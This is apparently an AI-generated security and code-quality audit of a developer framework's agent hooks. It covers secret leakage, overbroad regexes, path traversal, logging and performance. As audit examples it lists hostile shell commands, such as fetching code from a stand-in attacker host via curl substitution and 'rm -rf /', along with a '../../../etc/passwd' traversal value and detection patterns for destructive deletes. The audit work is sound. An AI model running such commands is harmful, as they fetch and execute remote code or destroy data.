# LAZY-DEV-FRAMEWORK Hooks Audit Report
**Date**: 2025-10-29
**Status**: REVIEW RECOMMENDED - Multiple improvements needed
**Total Hooks**: 9
**Critical Issues**: 4 | **High Priority**: 8 | **Medium Priority**: 12 | **Low Priority**: 6

---

## Executive Summary

The hooks implementation is **functionally solid** but has several areas requiring attention:

1. **Security**: API keys in f-strings, missing input sanitization, overly broad regex patterns
2. **Performance**: Duplicate regex compilation, long subprocess timeouts, unbounded log growth
3. **Error Handling**: Silent failures with bare `except` blocks, no structured logging
4. **Code Quality**: Duplicate imports in 5 files, inconsistent error handling patterns

---

## Critical Issues (Address Immediately)

### 1. API Key Security in `pre_prompt_enrichment.py`
**Risk Level**: CRITICAL
**Issue**: API key passed in f-string could be logged or exposed

```python
# UNSAFE - API key visible in error messages
enrichment_request = f"""You are a technical enrichment assistant for the LAZY-DEV-FRAMEWORK.

User's brief input: {user_input}
...
"""
```

**Fix**:
- Use `Template.substitute()` instead of f-strings
- Never interpolate API keys
- Validate API key format without echoing it

---

### 2. Input Sanitization in `pre_tool_use.py`
**Risk Level**: CRITICAL
**Issue**: Regex patterns `r'(?i)token'` and `r'(?i)secret'` block legitimate variable names

```python
# Will incorrectly block legitimate code:
# var token_value = ...
# config.secret_key = ...
```

**Fix**:
- Use specific patterns: `API_TOKEN=`, `SECRET_KEY=`, `PASSWORD=`
- Make patterns configurable via `LAZYDEV_SENSITIVE_FILES` env var
- Allowlist pattern for exceptions

---

### 3. Command Injection Detection in `pre_tool_use.py`
**Risk Level**: CRITICAL
**Issue**: Missing detection for shell injection patterns

```bash
# Not detected but dangerous:
sh -c "rm -rf /"
bash -c "$(curl attacker.com)"
eval "malicious code"
$(curl attacker.com)
```

**Fix**:
- Add patterns for: `sh -c`, `bash -c`, `eval`, `$(...)`, `` `...` ``
- Add pipe and redirect detection

---

### 4. Log File Secret Exposure in `log_events.py`
**Risk Level**: CRITICAL
**Issue**: Full commands logged without sanitization

```json
{
  "timestamp": "2025-10-29T10:00:00",
  "tool": "Bash",
  "tool_input": {
    "command": "curl -H 'Authorization: Bearer sk_live_abc123...'"
  }
}
```

**Fix**:
- Sanitize known secret keys before logging
- Implement redaction for API keys, tokens, passwords
- Add `LAZYDEV_LOG_SANITIZE=1` option

---

## High Priority Issues

### 5. Duplicate Imports
**Files Affected**: `session_start.py`, `user_prompt_submit.py`, `pre_tool_use.py`, `post_tool_use_format.py`, `stop.py`

```python
import os  # Line 21
import os  # Line 22 (DUPLICATE)
```

**Fix**: Remove duplicate imports

---

### 6. Performance: Regex Compilation in Loops
**Affected Hooks**: `pre_tool_use.py`, `user_prompt_submit.py`, `stop.py`

**Issue**: Patterns compiled on every hook execution

```python
# INEFFICIENT - compiles on every call
patterns = [
    r'\brm\s+.*-[a-z]*r[a-z]*f',
    r'\brm\s+.*-[a-z]*f[a-z]*r',
    # ... 4+ more patterns
]
for pattern in patterns:
    if re.search(pattern, normalized):
        return True
```

**Fix**: Move to module level
```python
# EFFICIENT - compile once
DANGEROUS_RM_PATTERNS = [
    re.compile(r'\brm\s+.*-[a-z]*r[a-z]*f'),
    re.compile(r'\brm\s+.*-[a-z]*f[a-z]*r'),
]
```

---

### 7. Path Traversal Risk
**Affected Hooks**: `session_start.py`, `stop.py`

**Issue**: `session_id` and `transcript_path` not validated

```python
session_id = input_data.get('session_id', 'unknown')
# Could be: "../../../etc/passwd"
session_file = sessions_dir / f'{session_id}.json'  # UNSAFE
```

**Fix**: Validate format
```python
if not re.match(r'^[a-zA-Z0-9_-]+$', session_id):
    raise ValueError(f"Invalid session_id: {session_id}")
```

---

### 8. Long Subprocess Timeouts
**Affected Hook**: `post_tool_use_format.py`

**Issue**: 10-second timeout is excessive

```python
result = subprocess.run(
    ['black', '--quiet', str(file_path)],
    timeout=10  # TOO LONG
)
```

**Recommendation**: Use 3-5 seconds maximum. Formatters shouldn't take long.

---

## Medium Priority Issues

### 9. Silent Error Handling
**Affected Hooks**: ALL

**Pattern**:
```python
try:
    result = subprocess.run(...)
except (subprocess.TimeoutExpired, subprocess.SubprocessError, FileNotFoundError):
    pass  # NO LOGGING - silent failure
```

**Fix**: Add logging
```python
import logging
logger = logging.getLogger(__name__)

try:
    result = subprocess.run(...)
except Exception as e:
    logger.warning(f"Git operation failed: {e}")
    pass
```

---

### 10. Log File Growth (Unbounded)
**Affected Hooks**: `log_events.py`, `pre_tool_use.py`, `post_tool_use_format.py`

**Issue**: No rotation, logs could grow to GB

**Fix**: Implement rotation
```python
import logging.handlers

handler = logging.handlers.RotatingFileHandler(
    log_file,
    maxBytes=100_000_000,  # 100MB
    backupCount=5
)
```

---

### 11. API Blocking Performance
**Affected Hook**: `pre_prompt_enrichment.py`

**Issues**:
- Creates new Anthropic client on every call
- Synchronous API call blocks hook execution
- No caching of enrichment results
- 1000 tokens per enrichment is expensive

**Recommendations**:
- Create client once at module level
- Implement simple cache: `{hash(prompt): enriched_text}`
- Consider making enrichment optional/skippable
- Add rate limiting

---

### 12. Context Pack Performance
**Affected Hook**: `user_prompt_submit.py`

**Issue**: `build_context_pack()` walks entire directory tree

```python
for root, dirs, files in _os.walk('.', topdown=True):
    # Could visit thousands of directories on large repos
```

**Fixes**:
- Respect `.gitignore` patterns
- Limit walk depth (already done, good)
- Cache results
- Add timeout mechanism (already done, but 200ms might be tight)

---

## Code Quality Issues

### 13. Duplicate Return Statement
**File**: `user_prompt_submit.py` lines 277-278

```python
return "\n".join(lines[:20])
return "\n".join(lines[:20])  # DUPLICATE
```

**Fix**: Remove one line

---

### 14. Inconsistent Error Messages
**Pattern**: Some hooks use `sys.stderr`, others use `json.dumps()`

**Fix**: Standardize on structured logging
```python
import logging
logger = logging.getLogger(__name__)

# Consistent across all hooks:
logger.error(f"Tool call blocked: {reason}")
```

---

## Configuration Issues

### Hook Execution Order

**Current**:
1. `UserPromptSubmit`: user_prompt_submit.py → pre_prompt_enrichment.py
2. `PreToolUse`: pre_tool_use.py → log_events.py
3. `PostToolUse`: post_tool_use_format.py → log_events.py → memory_suggestions.py → memory_router.py
4. `Stop`: stop.py → log_events.py → memory_router.py

**Issues**:
- If pre_tool_use.py blocks, log_events.py still runs - should log BEFORE blocking
- Long chain could accumulate latency
- No timeout on hook execution (API call could hang)

**Recommendation**: Reorder
```json
{
  "PreToolUse": [
    {
      "type": "command",
      "command": "log_events.py --event PreToolUse"  // LOG FIRST
    },
    {
      "type": "command",
      "command": "pre_tool_use.py --timeout 5"  // THEN BLOCK
    }
  ]
}
```

---

## Action Plan

### Phase 1: Security (Week 1)
- [ ] Fix API key exposure in pre_prompt_enrichment.py
- [ ] Fix regex overmatch in pre_tool_use.py
- [ ] Add command injection detection
- [ ] Implement log sanitization
- [ ] Add path validation to session_id/transcript_path

### Phase 2: Code Quality (Week 1-2)
- [ ] Remove duplicate imports
- [ ] Fix duplicate return statement
- [ ] Move regex patterns to module level
- [ ] Standardize error logging

### Phase 3: Performance (Week 2)
- [ ] Reduce subprocess timeouts
- [ ] Implement log rotation
- [ ] Add caching for expensive operations
- [ ] Optimize context pack walk

### Phase 4: Configuration (Week 3)
- [ ] Document all environment variables
- [ ] Reorder hook execution
- [ ] Add configuration validation
- [ ] Create troubleshooting guide

### Phase 5: Testing (Week 3-4)
- [ ] Add unit tests for regex patterns
- [ ] Add integration tests for hook failures
- [ ] Add performance tests
- [ ] Add security tests

---

## Environment Variables Reference

| Variable | Hook | Default | Purpose |
|----------|------|---------|---------|
| `LAZYDEV_LOG_DIR` | ALL | `.claude/data/logs` | Log directory |
| `LAZYDEV_DISABLE_STYLE` | user_prompt_submit.py | enabled | Disable output style detection |
| `LAZYDEV_DISABLE_CONTEXT_PACK` | user_prompt_submit.py | enabled | Disable context pack |
| `LAZYDEV_CONTEXT_PACK_BUDGET_MS` | user_prompt_submit.py | 200 | Time budget (ms) |
| `LAZYDEV_CONTEXT_PACK_MAX_DEPTH` | user_prompt_submit.py | 3 | Directory walk depth |
| `ANTHROPIC_API_KEY` | pre_prompt_enrichment.py | - | API key |
| `ENRICHMENT_MODEL` | pre_prompt_enrichment.py | - | Model name |
| `ENRICHMENT_MAX_TOKENS` | pre_prompt_enrichment.py | 1000 | Max enrichment tokens |
| `LAZYDEV_ALLOW_SUDO` | pre_tool_use.py | disabled | Allow sudo commands |
| `LAZYDEV_ENFORCE_TDD` | stop.py | disabled | Enforce TDD gate |
| `LAZYDEV_MIN_TESTS` | stop.py | 0 | Minimum test count |

---

## Testing Recommendations

```bash
# Unit tests needed for:
✓ Regex pattern validation (dangerous rm, force push, etc.)
✓ Session ID format validation
✓ Path traversal prevention
✓ Sensitive file detection
✓ Test result parsing

# Integration tests needed for:
✓ Full hook execution with real inputs
✓ Error propagation
✓ Log file creation and rotation
✓ API call handling

# Performance tests needed for:
✓ Large directory tree (100k+ files)
✓ Large log files (1GB+)
✓ Regex pattern compilation
✓ Concurrent hook execution
```

---

## File Paths for Implementation

**Audit Report**: `/LAZY_DEV/.claude/HOOKS_AUDIT_REPORT.json`
**This Summary**: `/LAZY_DEV/.claude/AUDIT_SUMMARY.md`
**All Hooks**: `/LAZY_DEV/.claude/hooks/`

---

## Next Steps

1. **Review this report** with the team
2. **Prioritize issues** based on your risk tolerance
3. **Create GitHub issues** for each priority phase
4. **Assign developers** to fix security issues first
5. **Add to Sprint 2** implementation plan
6. **Update CLAUDE.md** with configuration docs

---

**Report Generated**: 2025-10-29
**Generated By**: Claude Code Hooks Audit Tool
**Framework**: LAZY-DEV-FRAMEWORK
